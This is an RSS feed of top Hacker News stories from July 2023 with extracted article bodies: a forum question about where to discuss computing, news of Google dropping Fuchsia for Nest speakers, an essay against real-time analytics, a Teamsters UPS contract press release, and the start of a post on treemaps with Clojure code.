<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 26 Jul 2023 07:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Where do you discuss computer related stuff now? (111 pts)]]></title>
            <link>https://lobste.rs/s/ih3cwj/where_do_you_discuss_computer_related</link>
            <guid>36873131</guid>
            <pubDate>Wed, 26 Jul 2023 04:34:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lobste.rs/s/ih3cwj/where_do_you_discuss_computer_related">https://lobste.rs/s/ih3cwj/where_do_you_discuss_computer_related</a>, See on <a href="https://news.ycombinator.com/item?id=36873131">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <p>With so many twitter alternatives, the death of forums, the explosion of chats / video platforms and the reddit shenanigans, we are once again facing this decades old question.</p>
<p>So far, only Hacker News has stood the test of time, and you cannot really discuss random topics, it‚Äôs more about link sharing. ‚ÄúAsk HN‚Äù is not the main dish, so to speak, and the heavy curating that keeps the quality up also limit the volume of interactions by design. Lobster is basically a mini HN.</p>
<p>So where do you go when you want to geek out?</p>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google abandons work to move Assistant smart speakers to Fuchsia (114 pts)]]></title>
            <link>https://9to5google.com/2023/07/25/google-abandons-assistant-speakers-fuchsia/</link>
            <guid>36871673</guid>
            <pubDate>Wed, 26 Jul 2023 00:39:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://9to5google.com/2023/07/25/google-abandons-assistant-speakers-fuchsia/">https://9to5google.com/2023/07/25/google-abandons-assistant-speakers-fuchsia/</a>, See on <a href="https://news.ycombinator.com/item?id=36871673">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					
<figure>
			<img src="https://9to5google.com/wp-content/uploads/sites/4/2020/10/google_nest_audio_sand_2.jpg?quality=82&amp;strip=all&amp;w=1600" srcset="https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2020/10/google_nest_audio_sand_2.jpg?w=320&amp;quality=82&amp;strip=all&amp;ssl=1 320w, https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2020/10/google_nest_audio_sand_2.jpg?w=640&amp;quality=82&amp;strip=all&amp;ssl=1 640w, https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2020/10/google_nest_audio_sand_2.jpg?w=1024&amp;quality=82&amp;strip=all&amp;ssl=1 1024w, https://i0.wp.com/9to5google.com/wp-content/uploads/sites/4/2020/10/google_nest_audio_sand_2.jpg?w=1500&amp;quality=82&amp;strip=all&amp;ssl=1 1500w" width="1600" height="800" alt="Nest Audio review" fetchpriority="high">
	
	</figure>

<p>Less than a year after the work was first discovered, it seems Google has abandoned its plans to upgrade its line of Assistant smart speakers to the Fuchsia operating system.</p>



<p>Since 2017, we‚Äôve been closely following the development of Fuchsia, Google‚Äôs in-house operating system. In that time, it went from an early prototype to being the underlying software that powers all three of Google‚Äôs Nest Hub smart displays. Along the way, Google has also worked on supporting other hardware on Fuchsia, including the Pixelbook series, developer boards, and more.</p>



<p>Last year, we reported that Google‚Äôs Fuchsia team had <a href="https://9to5google.com/2022/10/21/google-nest-speakers-fuchsia-2023/">renewed its efforts</a> to support smart speakers. Long story short, the team had experimented with a single speaker, ditched that effort, then ‚Äúrestored‚Äù it later on. More importantly, the Fuchsia team was found to be working on multiple speakers, the most notable of which was an <a href="https://9to5google.com/2022/11/15/nest-speaker-uwb-handoff-apple-homepod/">as-yet-unreleased speaker equipped with UWB</a>.</p>



<p>This, along with the direct involvement of the SoC manufacturer Amlogic, signaled to us that Fuchsia was on track to replace the underlying ‚ÄúCast OS‚Äù of speakers <a href="https://9to5google.com/2022/12/07/google-nest-audio-fuchsia-upgrade/">like the Nest Audio</a> after accomplishing the same feat for the Nest Hub series. However, it seems that this will no longer be the case.</p>



<p>In a newly posted <a href="https://fuchsia-review.googlesource.com/c/fuchsia/+/888834">code change</a>, the Fuchsia team formally marked all of its speaker hardware as ‚Äúunsupported‚Äù and altogether removed the related code. Among the hardware now unsupported by Fuchsia, you‚Äôll find the underlying SoCs for the Nest Mini, Nest Audio, Nest Wifi point, a potentially upcoming Nest speaker, and some Android Things-based smart speakers.</p>



<p>The Fuchsia team hasn‚Äôt shared a reason why its smart speaker efforts were discontinued. One issue that potentially played a role is that the Amlogic A113L chip used in ‚ÄúClover‚Äù ‚Äì an unknown device that we suspect may be the Pixel Tablet dock ‚Äì <a href="https://fuchsia-review.googlesource.com/c/fuchsia/+/808670">does not meet</a> Fuchsia‚Äôs strict CPU requirements. Amlogic‚Äôs engineers <a href="https://fuchsia-review.googlesource.com/c/fuchsia/+/789422?usp=search">attempted to work around</a> this issue, seemingly to no avail.</p>




	<p>Another factor may be the sweeping layoffs that Google enacted at the beginning of the year. Early estimates suggested at least 16% of the Fuchsia team‚Äôs approximately 400 members were laid off, while a reliable source tells <em>9to5Google</em> that the final number, after international layoffs, was upwards of 20%.</p>



<p><strong>Read more:</strong> <a href="https://9to5google.com/2023/01/21/fuchsia-area-120-google-layoffs/">Google‚Äôs Fuchsia and Area 120 see significant cuts in layoffs</a></p>



<p>Whatever the reasoning, it‚Äôs disappointing to us to see the door close on Fuchsia‚Äôs most obvious next step after smart displays. To a certain degree, it seems some Googlers on the team share in that sentiment. One engineer commented on the code change to salute the departing hardware (‚Äúü´°‚Äù), while another metaphorically poured one out (‚Äúü´ó‚Äù) for the outgoing speakers.</p>



<p>Importantly, the Nest Hub series of smart displays are entirely unaffected by this change. Those devices will continue to run Fuchsia under the hood and will continue to receive updates as normal.</p>



<h2 id="h-more-on-fuchsia">More on Fuchsia:</h2>



<ul>
<li><a href="https://9to5google.com/2023/05/02/nest-hub-2nd-gen-fuchsia-update/">Nest Hub 2nd Gen updates to Google‚Äôs Fuchsia operating system</a></li>



<li><a href="https://9to5google.com/2023/01/10/google-fuchsia-launch-upcoming-device/">Google accidentally reveals an upcoming device will launch with Fuchsia</a></li>



<li><a href="https://9to5google.com/2022/08/30/fuchsia-director-interview-chris-mckillop/">Interview: Fuchsia‚Äôs past, present, and future, as told by ex-director Chris McKillop</a></li>
</ul>
	<p>
		<a target="_blank" rel="nofollow" href="https://news.google.com/publications/CAAqBwgKMMqA-Qow-c_gAg?hl=en-US&amp;gl=US&amp;ceid=US:en">
			<em>Add 9to5Google to your Google News feed.</em>&nbsp;
					</a>
	</p>
	<div><p><em>FTC: We use income earning auto affiliate links.</em> <a href="https://9to5mac.com/about/#affiliate">More.</a></p><p><a href="https://bit.ly/3QcZvke"><img src="https://9to5google.com/wp-content/uploads/sites/6/2023/03/DECLUTTR-9TO5GOOGLE23-Generic-Version-2-1.jpg?quality=82&amp;strip=all" alt="" width="1024" height="205"></a></p></div>				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Whom the gods would destroy, they first give real-time analytics (2013) (129 pts)]]></title>
            <link>https://mcfunley.com/whom-the-gods-would-destroy-they-first-give-real-time-analytics</link>
            <guid>36870140</guid>
            <pubDate>Tue, 25 Jul 2023 21:56:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mcfunley.com/whom-the-gods-would-destroy-they-first-give-real-time-analytics">https://mcfunley.com/whom-the-gods-would-destroy-they-first-give-real-time-analytics</a>, See on <a href="https://news.ycombinator.com/item?id=36870140">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <blockquote>
  <p>Homer: There's three ways to do things. The right way, the wrong way, and the <em>Max Power</em> way!</p>
  <p>Bart: Isn't that the wrong way?</p>
  <p>Homer: Yeah. But faster!</p>
  <p>- "Homer to the Max"</p>
</blockquote>

<p>Every few months, I try to talk someone down from building a real-time product analytics system. When I‚Äôm lucky, I can get to them early.</p>

<p>The turnaround time for most of the web analysis done at Etsy is at least 24 hours. This a ranking source of grousing. Decreasing this interval is periodically raised as a priority, either by engineers itching for a challenge or by others hoping to make decisions more rapidly. There are companies out there selling instant usage numbers, so why can‚Äôt we have them?</p>

<p>Here‚Äôs an excerpt from a manifesto demanding the construction of such a system. This was written several years ago by an otherwise brilliant individual, whom I respect. I have made a few omissions for brevity.</p>

<blockquote>
  <p><strong><em>We believe in‚Ä¶</em></strong></p>

  <ol>
    <li><strong>Timeliness</strong>. I want the data to be at most 5 minutes old. So this is a near-real-time system.</li>
    <li><strong>Comprehensiveness</strong>. No sampling. Complete data sets.</li>
    <li><strong>Accuracy</strong> (how precise the data is). Everything should be accurate.</li>
    <li><strong>Accessibility</strong>. Getting to meaningful data in Google Analytics is awful. To start with it‚Äôs all 12 - 24 hours old, and this is a huge impediment to insight &amp; action.</li>
    <li><strong>Performance</strong>. Most reports / dashboards should render in under 5 seconds.</li>
    <li><strong>Durability</strong>. Keep all stats for all time. I know this can get rather tough, but it‚Äôs just text.</li>
  </ol>
</blockquote>

<p>The 23-year-old programmer inside of me is salivating at the idea of building this. The burned out 27-year-old programmer inside of me is busy writing an email about how all of these demands, taken together, probably violate the <a href="http://en.wikipedia.org/wiki/CAP_theorem">CAP theorem</a> somehow and also, hey, did you know that accuracy and precision are different?</p>

<p>But the 33-year-old programmer (who has long since beaten those demons into a bloody submission) sees the difficulty as irrelevant at best. Real-time analytics are <em>undesirable</em>. While there are many things wrong with our infrastructure, I would argue that the waiting is not one of those things.</p>

<p>Engineers might find this assertion more puzzling than most. I am sympathetic to this mindset, and I can understand why engineers are predisposed to see instantaneous A/B statistics as self-evidently positive. We monitor everything about our site in real time. Real-time metrics and graphing are the key to deploying 40 times daily with relative impunity. <a href="http://codeascraft.etsy.com/2011/02/15/measure-anything-measure-everything/">Measure anything, measure everything</a>!</p>

<figure>
  <img src="https://mcfunley.com/assets/images/deploy-dash.png" alt="Part of the deploy dashboard at Etsy. We love up-to-the-minute graphs.">
  <figcaption>Part of the deploy dashboard at Etsy. We love up-to-the-minute graphs.</figcaption>
</figure>

<p>This line of thinking is a trap. It‚Äôs important to divorce the concepts of operational metrics and product analytics. Confusing <em>how we do things</em> with <em>how we decide which things to do</em> is a fatal mistake.</p>

<p>So what is it that makes product analysis different? Well, there are many ways to screw yourself with real-time analytics. I will endeavor to list a few.</p>

<p>The first and most fundamental way is to disregard statistical significance testing entirely. This is a rookie mistake, but it‚Äôs one that‚Äôs made all of the time. Let‚Äôs say you‚Äôre testing a text change for a link on your website. Being an impatient person, you decide to do this over the course of an hour. You observe that 20 people in bucket A clicked, but 30 in bucket B clicked. Satisfied, and eager to move on, you choose bucket B. There are probably thousands of people doing this right now, <em>and they‚Äôre getting away with it.</em></p>

<p>This is a mistake because there‚Äôs no measurement of how likely it is that the observation (20 clicks vs. 30 clicks) was due to chance. Suppose that we weren‚Äôt measuring text on hyperlinks, but instead we were measuring two quarters to see if there was any difference between the two when flipped. As we flip, we could see a large gap between the number of heads received with either quarter. But since we‚Äôre talking about quarters, it‚Äôs more natural to suspect that that difference might be due to chance. Significance testing lets us ascertain how likely it is that this is the case.</p>

<p>A subtler error is to do significance testing, but to halt the experiment as soon as significance is measured. This is <a href="http://www.evanmiller.org/how-not-to-run-an-ab-test.html">always a bad idea</a>, and the problem is exacerbated by trying to make decisions far too quickly. Funny business with timeframes can coerce most A/B tests into statistical significance.</p>

<figure>
  <img src="https://mcfunley.com/assets/images/real-time-screwed.png" alt="A simulation of flipping two fair coins. In the green regions, the difference in the number of heads is measured to be significant. If we stopped flipping in those regions, we would (incorrectly) decide the coins were different.">
  <figcaption>A simulation of flipping two fair coins. In the green regions, the difference in the number of heads is measured to be significant. If we stopped flipping in those regions, we would (incorrectly) decide the coins were different.</figcaption>
</figure>

<p>Depending on the change that‚Äôs being made, making <em>any</em> decision based on a single day of data could be ill-conceived. Even if you think you have plenty of data, it‚Äôs not farfetched to imagine that user behavior has its own rhythms. A conspicuous (if basic) example of this is that Etsy sees 30% more orders on Tuesdays than it does on Sundays.</p>

<figure>
  
  <figcaption>Gratuitous infographic courtesy <a href="http://www.thenitpickster.com/">Brendan Sudol</a>.</figcaption>
</figure>

<p>While the sale count itself might not skew a random test, user demographics could be different day over day. Or very likely, you could see a major difference in user behavior immediately upon releasing a change, only to watch it evaporate as users learn to use new functionality. Given all of these concerns, the conservative and reasonable stance is to only consider tests that last a few days or more.</p>

<p>One could certainly have a real-time analytics system without making any of these mistakes. (To be clear, I find this unlikely. Idle hands stoked by a stream of numbers are the devil‚Äôs playthings.) But unless the intention is to make decisions with this data, one might wonder what the purpose of such a system could possibly be. Wasting the effort to erect complexity for which there is no use case is perhaps the worst of all of these possible pitfalls.</p>

<p>For all of these reasons I‚Äôve come to view delayed analytics as positive. The turnaround time also imposes a welcome pressure on experimental design. People are more likely to think carefully about how their controls work and how they set up their measurements when there‚Äôs no promise of immediate feedback.</p>

<p>Real-time web analytics is a seductive concept. It appeals to our desire for instant gratification. But the truth is that there are very few product decisions that can be made in real time, if there are any at all. Analysis is difficult enough already, without attempting to do it at speed.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[‚ÄúWe‚Äôve Changed the Game‚Äù: Teamsters Win Historic UPS Contract (193 pts)]]></title>
            <link>https://teamster.org/2023/07/weve-changed-the-game-teamsters-win-historic-ups-contract/</link>
            <guid>36869738</guid>
            <pubDate>Tue, 25 Jul 2023 21:17:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://teamster.org/2023/07/weve-changed-the-game-teamsters-win-historic-ups-contract/">https://teamster.org/2023/07/weve-changed-the-game-teamsters-win-historic-ups-contract/</a>, See on <a href="https://news.ycombinator.com/item?id=36869738">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
							<picture>
					
    <img src="https://teamster.org/wp-content/uploads/2023/07/20230703-ChangedGameRedx-IG-1-1264x1264.jpg" srcset="https://teamster.org/wp-content/uploads/2023/07/20230703-ChangedGameRedx-IG-1-406x406.jpg 406w, https://teamster.org/wp-content/uploads/2023/07/20230703-ChangedGameRedx-IG-1-812x812.jpg 812w, https://teamster.org/wp-content/uploads/2023/07/20230703-ChangedGameRedx-IG-1-632x632.jpg 632w, https://teamster.org/wp-content/uploads/2023/07/20230703-ChangedGameRedx-IG-1-1264x1264.jpg 1264w, https://teamster.org/wp-content/uploads/2023/07/20230703-ChangedGameRedx-IG-1-865x865.jpg 865w, https://teamster.org/wp-content/uploads/2023/07/20230703-ChangedGameRedx-IG-1-1730x1730.jpg 1730w" sizes="(max-width: 500px), (max-width: 980px), (min-width: 980px)" alt="20230703-ChangedGameRedx-IG (1)">

				</picture>
						<h3>Deal Results in Higher Wages, More Jobs, Equal Pay, A/C, MLK Day, Part-Time Rewards </h3>
			
	<p><strong>Press Contact: Kara Deniz</strong>&nbsp;Email: kdeniz@teamster.org</p>


<p>(WASHINGTON) ‚Äì Today, the Teamsters reached the most historic tentative agreement for workers in the history of UPS, protecting and rewarding more than 340,000 UPS Teamsters nationwide. The overwhelmingly lucrative contract raises wages for all workers, creates more full-time jobs, and includes dozens of workplace protections and improvements. The UPS Teamsters National Negotiating Committee unanimously endorsed the five-year tentative agreement.</p>



<p>‚ÄúRank-and-file UPS Teamsters sacrificed everything to get this country through a pandemic and enabled UPS to reap record-setting profits. Teamster labor moves America. The union went into this fight committed to winning for our members. We demanded the best contract in the history of UPS, and we got it,‚Äù said Teamsters General President Sean M. O‚ÄôBrien. ‚ÄúUPS has put $30 billion in new money on the table as a direct result of these negotiations. We‚Äôve changed the game, battling it out day and night to make sure our members won an agreement that pays strong wages, rewards their labor, and doesn‚Äôt require a single concession. This contract sets a new standard in the labor movement and raises the bar for all workers.‚Äù</p>



<p>‚ÄúUPS came dangerously close to putting itself on strike, but we kept firm on our demands. In my more than 40 years in Louisville representing members at Worldport ‚Äî the largest UPS hub in the country ‚Äî I have never seen a national contract that levels the playing field for workers so dramatically as this one. The agreement puts more money in our members‚Äô pockets and establishes a full range of new protections for them on the job,‚Äù said Teamsters General Secretary-Treasurer Fred Zuckerman. ‚ÄúWe stayed focused on our members and fought like hell to get everything that full-time and part-time UPS Teamsters deserve.‚Äù</p>



<p>‚ÄúRank-and-file members served on the committee for the first time, so we got to show up every day to support our fellow Teamsters and share their stories,‚Äù said Brandy Harris, a part-time UPS Teamster with Local 174 in Seattle and a member of the Teamsters National Negotiating Committee. ‚ÄúOur hard work has paid off ‚Äî from those members and leaders negotiating for more at the table to my sisters and brothers building a credible strike threat around the country. Our union was organized and we were relentless. We‚Äôve hit every goal that UPS Teamster members wanted and asked for with this agreement. It‚Äôs a ‚Äòyes‚Äô vote for the most historic contract we‚Äôve ever had.‚Äù</p>



<p>Highlights of the tentative 2023-2028 UPS Teamsters National Master Agreement include:</p>



<ul>
<li>Historic wage increases. Existing full- and part-time UPS Teamsters will get $2.75 more per hour in 2023, and $7.50 more per hour over the length of the contract.</li>
</ul>



<ul>
<li>Existing part-timers will be raised up to no less than $21 per hour immediately, and part-time seniority workers earning more under a market rate adjustment would still receive all new general wage increases.</li>
</ul>



<ul>
<li>General wage increases for part-time workers will be double the amount obtained in the previous UPS Teamsters contract ‚Äî and existing part-time workers will receive a 48 percent average total wage increase over the next five years.</li>
</ul>



<ul>
<li>Wage increases for full-timers will keep UPS Teamsters the highest paid delivery drivers in the nation, improving their average top rate to $49 per hour.</li>
</ul>



<ul>
<li>Current UPS Teamsters working part-time would receive longevity wage increases of up to $1.50 per hour on top of new hourly raises, compounding their earnings.</li>
</ul>



<ul>
<li>New part-time hires at UPS would start at $21 per hour and advance to $23 per hour.</li>
</ul>



<ul>
<li>All UPS Teamster drivers classified as 22.4s would be reclassified immediately to Regular Package Car Drivers and placed into seniority, ending the unfair two-tier wage system at UPS.</li>
</ul>



<ul>
<li>Safety and health protections, including vehicle air conditioning and cargo ventilation. UPS will equip in-cab A/C in all larger delivery vehicles, sprinter vans, and package cars purchased after Jan. 1, 2024. All cars get two fans and air induction vents in the cargo compartments.</li>
</ul>



<ul>
<li>All UPS Teamsters would receive Martin Luther King Day as a full holiday for the first time.</li>
</ul>



<ul>
<li>No more forced overtime on Teamster drivers‚Äô days off. Drivers would keep one of two workweek schedules and could not be forced into overtime on scheduled off-days.</li>
</ul>



<ul>
<li>UPS Teamster part-timers will have priority to perform all seasonal support work using their own vehicles with a locked-in eight-hour guarantee. For the first time, seasonal work will be contained to five weeks only from November-December.</li>
</ul>



<ul>
<li>The creation of 7,500 new full-time Teamster jobs at UPS and the fulfillment of 22,500 open positions, establishing more opportunities through the life of the agreement for part-timers to transition to full-time work.</li>
</ul>



<ul>
<li>More than 60 total changes and improvements to the National Master Agreement ‚Äî more than any other time in Teamsters history ‚Äî and zero concessions from the rank-and-file.</li>
</ul>



<p>On July 31, representatives of the 176 UPS Teamster locals in the U.S. and Puerto Rico will meet to review and recommend the tentative agreement. All UPS rank-and-file members will receive a list of improvements in the contract. Locals will conduct member meetings and Teamsters will have several weeks to vote on the offer electronically. Member voting begins August 3 and concludes August 22.</p>



<p>The UPS Teamsters National Master Agreement is the single largest private-sector collective bargaining agreement in North America. &nbsp;</p>



<p>Founded in 1903, the Teamsters Union represents 1.2 million hardworking people in the U.S., Canada, and Puerto Rico. Visit&nbsp;<a href="https://nam04.safelinks.protection.outlook.com/?url=https%3A%2F%2Fu7061146.ct.sendgrid.net%2Fls%2Fclick%3Fupn%3D4tNED-2FM8iDZJQyQ53jATUcsZiLbJRNadTeGF65UTAXn3JDe0AGQx6ooIbLPzmo26VG0H5JqHw1xN7FIF8ufYZ1L5bgH79SQGtMYyST-2F8ZNU06ElIJmQRltt-2F9QYz5SI7Yyf0qbQKzf7HOCqGMJAOChVJDufJBt3g8IGtuNF0L9298R20yA2i5PWCUh49IrpkO0gPMRlsGl-2BKcKAoptXGQ1KFN-2BSBl-2BWr9H7GZmaL3cE9t-2FZ4-2BQ97m0p5XC5HnpOzZ6Q2fP6cJOx39isXs778vSvq3FLqGJhUsYJVGsohezZ5V8BNTZ4CRIm-2FIxtPgFQZytJe-2FO9sFzBrnvGtiG36uLjR-2BLxlYBJbO1SGfxcs4xTUMX0m08zvETsiq5YwA9YmVfU9OtJxfVrZSRvtOVa9-2FCJ3-2F9rX0eO8YoLY8z2K2pSl2RhziSuzFDYCHOB0FpKvuWifNf3czVhcXB6kPCnbrs6vplmePkfLMNozDByUUJFgZnLs9DKF0Ls4S3IsMq8ho-2FLmtK5feFWDjY1jADwLzmjxmxjfOvpDxZ2HM1kve4kuMdhNUpN5dljK4vQ9jIdRXqdOq0uo3LuKVG5-2BohHtJiopPDfIhTSHY8RFd3WbCJV1lDr63TZmvXHMknmrIUsztYC8tD6hlB19gJaOGtV3YBUwZVFXyzAnz8sP9fKDB6FKqEmaOSNiti-2FQNkh3819qdBNSmpistrT92wSt9L63NgQW5-2B534RtnZfKZa5THdIrov9A2ETOBrDjp-2FJcn2fPJhS8NF00T8jz5y3HcX0eK5fjGCHmdKooI8WgY4nt0t42jOA7AUN7d8eIxAHP0liX28SlWEKnZkVO0gLV8rIt87SoZx0V1-2FNgrpkxh7V9LdM3195xJuqTl42oJXP7GQ7SRryfM2aMTnXx7pJQxFobMlLek1sQCmPtfCsmJdl7pjxyMGmZuFvt-2BQKaccpUSWXzNjglDwRqxDAWp-2FdNqf6MCmE-2FjDgGsrDhkAJo2EVdgTchXrlCOBEIkyxpcYhSJNH0eUdzxNArCZOZHTix1rNh55NH9YVSaVUbxbC-2FTJ-2FRvMRAzzV6BeucUMRC-2Bloq6Nz5hOduTdPCTu3pRZ-2ByFaHwxH0A8t1Mxk2A1SYTVT5LAGGS3BLfekQRHmbahdvbKdHPy-2FEED-2Bo3jCRQLUywqFQO2nMwyAFernKgedzeYmrSIP9KLVo8lJTZ5Rmteu84NdC8EWV-2BG59zSvdhCXsIRNlPk0wEonsuVYn7mWJUX1sFqttF0pKsWVeIpbXuBrIhmSpAkQijSBMnZx-2Fa-2F21HtpKpFcj2czk0q-2B8MrIHcszOWDIrF57OF6-2BcmmQB-2FP22Yc4PEbOcbW-2B-2F3xnGFFycgqyzjVNDDeRmLpROt3kTEFDGt0A0QTxdoml-2FaJ4E8dgTDAyu-2BW-2By1wUg452kRHmhZxHyqk-2FbBrDDuB1nxh4BAoikmdNXlhh5RJ6ykjroV-2BsdMKUL0-2BmUrwg88V8E120ZHvEQVvZyB9S3pwfLdIhdGTNhmnXNxrBqYyySpJv-2Brw1MslvFtlWCDbFxOYyPYG6dBx0sG5ccmBZlo9M-2BTCT6-2FotjPaEivgZLAQtm-2F7VONuvL5Ai8aJuLL7jDoqv6-2BZc8qj0xH66lZYLh9DTSa2pmLVF1dH5N7vya2zK7CNYpreiLflImJfo04x-2FrwyOo40HXYKRyP4WPC278f4yxrsGlZ4nE8beqLjR6dzFJinO49OGnjvc2QIT0C4N3eFdOEQNNNnExG152VkR-2FXAz0EAaFdHM0RBYGZN3CEvljDDyLb9iAZMb8MOlXjUxGleNt70pwnbAp7rYh-2Bzpiu1yphp496p3rTe-2FcIGH2UvbqoKS06OsD3A6rRpxZ1D2DK5i1rnRj">Teamster.org</a> to learn more and follow us on Twitter @Teamsters and on Facebook at&nbsp;<a href="https://nam04.safelinks.protection.outlook.com/?url=https%3A%2F%2Fu7061146.ct.sendgrid.net%2Fls%2Fclick%3Fupn%3D4tNED-2FM8iDZJQyQ53jATUcsZiLbJRNadTeGF65UTAXn3JDe0AGQx6ooIbLPzmo26VG0H5JqHw1xN7FIF8ufYZ1L5bgH79SQGtMYyST-2F8ZNU06ElIJmQRltt-2F9QYz5SI7Yyf0qbQKzf7HOCqGMJAOChVJDufJBt3g8IGtuNF0L9298R20yA2i5PWCUh49IrpkO0gPMRlsGl-2BKcKAoptXGQ1KFN-2BSBl-2BWr9H7GZmaL3cE9t-2FZ4-2BQ97m0p5XC5HnpOzZ6Q2fP6cJOx39isXs778vSvq3FLqGJhUsYJVGsohezZ5V8BNTZ4CRIm-2FIxtPgFQZytJe-2FO9sFzBrnvGtiG36uLjR-2BLxlYBJbO1SGfxcs4xTWyEJ9BOnTMSstCyecgCZZqMnrCM6Pg57Zkia13F4Xe6zw6zVSn39MsgHcOx7erHrK3-2BA0BzA6SDzt0n-2BYPiz-2BBF9C8jH1KDH9-2FrUHqQc5TytVJ6iFKddrDAiDB2sK-2BYwxwqZgkCXmO7NeSN4yVXltqJ1DXkqGVgLqpc8fxzH0iALZpouOM4ndiVYK3BB3ZqppXTMQoV9YbqBw0MFC1wooW7tlrgnGSz3dbklMnkD3-2BJvqpk9iIV3LJUGU-2Fl2VO42G2KUIFHiwVS2aSdWf3xTSvDs7-2BHZ5BUEPkCsEhS36wUiDb2QZZ26U7Uj-2FJg3Q01-2FhRNxD0U-2FPifn8Zqiy26hAjZF3tOpx8CfS2P40Vg77vtVuBE7oNIF1LO5sK2KCbuLhBkUpyN-2FODZPR84lJ-2FfDqvRxJr-2BcTFITfveyleVpgZiCpBbYopJSp-2BZy-2BJtFbH-2FcVsWUnQTQhlJCA61hO133NYBRj-2BqvZprzIw7SwhZDP4Hx6CV9A2cepvnjukr-2BDk7TjQDCz5xYI7fbsgUcg84jDpIWkCbruKcfUqRMF2Avf0eES7C2YwGGPVX-2BWQ53QLsA9NhpiCLZnhgAB-2B7wolsu6MI38q-2Fr6IBAFYA4o-2BYGpskkgRUu24dupQr1X3syL-2F31Bh5KvKNBVWXfoY9E5pfDpvNCejqMM3ZlIo0LKTvxGyjpNOInogASBIGdq9luoFpbHkd-2BHc-2FYf8LsVif5q68x28i2ZvoKfsNidsZGGglE8N7PzePTEnKLs5Nv-2BLSWDyahf-2FtvwJplng72YhV4NT-2FzF6-2FUacrkjr6owbkAO7pst8e9qI6-2FJI8zu-2FC1MCcYDMv9h-2F-2FiEYrjbA-2B7ND9AyS7k8c5jVQzDm4LZ0N6HtVixCzPUgHqPrPXeDW-2Bj5IbVX3TRWqJiPqsAH9zcsYRSuKjGSgk5P67DQ7MWUnJ2Sd4cqn9D8pBR-2BhQTfdp1o7C9nP-2F909CgFABkZK58dp3WDgFN-2Fa5icvayYXfsgSnRURpZIXD7gXM3NhJcvAlYXO4M9BhTuSInykz3RA5PQvp83SZ1Mrkq2-2FRHfZxM-2B2o0OPlMm4zVhxPThMfs-2B9FosdCRAvCYr3-2F8kMCi7TBTPWVElxMaUnK5Ylj21Xd60UKJjLC6yoFvD5irlWg1P6r3Mg1r6Qx2jr3qoyiLtb06l57SAdNh2yvv9wc77R6Xbq02mwAHrfYUXac-2Fx5YbNshjHy7mmmrp9tihTdhu-2FeFXYP3dhHIV2WfYIxcCIyfxR0ERSSSGJQPnbmsPmeozhIbybhY9wx6nWC2eMrAn2guC286-2Fzqjg6Nz9EGx4AiA-2BPteWYRr7n9nVVS-2B2tmH3qC7KGQ0PC6gLFvKASktvECwSTl4Y6w7SxpNqco8VIRReMaPY-2BDV3uuo4VNMYOLmOHfTjJGpAABmlVFGjFjJ7-2Bp9hUDM6XayIVuEEccapWiMn32x4Wee4R0XoGPHnDL2EYFLmB1el5ujrSZTjGRfGr-2BQNB">Facebook.com/teamsters</a>.</p>


		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Treemaps are awesome (170 pts)]]></title>
            <link>https://blog.phronemophobic.com/treemaps-are-awesome.html</link>
            <guid>36868940</guid>
            <pubDate>Tue, 25 Jul 2023 20:31:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.phronemophobic.com/treemaps-are-awesome.html">https://blog.phronemophobic.com/treemaps-are-awesome.html</a>, See on <a href="https://news.ycombinator.com/item?id=36868940">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2 id="Why-treemaps">Why treemaps?</h2><p>Treemaps are an underutilized visualization that are capable of generically summarizing data of many shapes and sizes. To date, they've mostly been used for displaying the files consuming all of your disk space, but with a few tweaks, treemaps can be a flexible tool for exploring and navigating messy data blobs.</p><p>Treemaps are space filling. You provide the bounds, and the the treemap algorithm will generate a graphic that uses all of the pixels. This is in contrast to something like pprint, which generates a view of the data that is proportional to the amount of data. Bounding the size of the visual representation has the advantage that treemaps scale gracefully for small to medium sized data.</p><p>Treemaps will use as many pixels as are available to represent the underlying data. In general, more pixels means more clarity. However, the treemap performs well even at relatively small sizes.</p><p><img alt="Sizes Example" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/sizes-example.gif"></p><p>Treemaps are very flexible. They can visualize any data that is tree-like which includes any data that can be represented as JSON or edn.</p><blockquote><p>treemapping is a method for displaying hierarchical data using nested figures, usually rectangles.<br></p></blockquote><p>At its heart, constructing a treemap is straightforward. Given some tree-like data and a rectangle, subdivide the rectangle into smaller rectangles for each of the tree's branches and then recursively apply the same algorithm for each branch.</p><div><pre><span>(</span><span>defn</span> <span>treemap</span> <span>[</span><span>tree-node</span> <span>rect</span><span>]</span>
  <span>(</span><span>if</span> <span>(</span><span>branch?</span> <span>tree-node</span><span>)</span>
    <span>(</span><span>let</span> <span>[</span><span>child-rects</span> <span>(</span><span>subdivide</span> <span>rect</span> <span>(</span><span>children</span> <span>tree-node</span><span>)</span><span>)</span><span>]</span>
      <span>(</span><span>mapcat</span> <span>(</span><span>fn</span> <span>[</span><span>child</span> <span>child-rect</span><span>]</span>
                <span>(</span><span>treemap</span> <span>child</span> <span>child-rect</span><span>)</span><span>)</span>
              <span>(</span><span>children</span> <span>tree-node</span><span>)</span>
              <span>child-rects</span><span>)</span><span>)</span>
    <span>[</span><span>rect</span><span>]</span><span>)</span><span>)</span>
